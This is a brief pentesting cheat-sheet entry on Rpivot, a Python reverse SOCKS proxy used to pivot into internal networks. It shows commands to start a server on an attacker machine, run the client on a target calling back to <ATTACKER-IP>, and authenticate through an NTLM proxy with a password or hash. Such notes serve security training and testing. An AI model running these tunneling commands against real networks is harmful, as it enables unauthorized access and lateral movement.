>! SOCKS4 reverse proxies only
>! Python 2.6-2.7 compatibility only

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse #SOCKS proxy tool written in Python for SOCKS tunneling. It binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. It works like ssh dynamic port forwarding but in the opposite direction and has no dependencies beyond the standard library.
# Example Usage
If a remoter system has a webserver:
1. Start SOCKS proxy server on Attacking machine:
```shell-session
$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
2. [[File Transfer|Transfer]] `rpivot` to target and run proxy client:
```shell-session
$ python2.7 client.py --server-ip <ATTACKER-IP> --server-port 9999
```
3. Configure proxychains for `localhost 9050`
4. We should be able to access the remote webserver:
```shell-session
$ proxychains firefox-esr <REMOTER-WEBSERVER-IP>:80
```

If we cannot directly pivot to an external server (attack host) on the cloud due to [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username:password as follows:
```shell-session
$ python2.7 client.py --server-ip <REMOTER-WEBSERVER-IP> --server-port 8080 --ntlm-proxy-ip <PROXY-IP> --ntlm-proxy-port 8081 --domain <WINDOWS-DOMAIN> --username <USER> [--password <PASSWORD>/--hashes <NT:LM HASH>]
```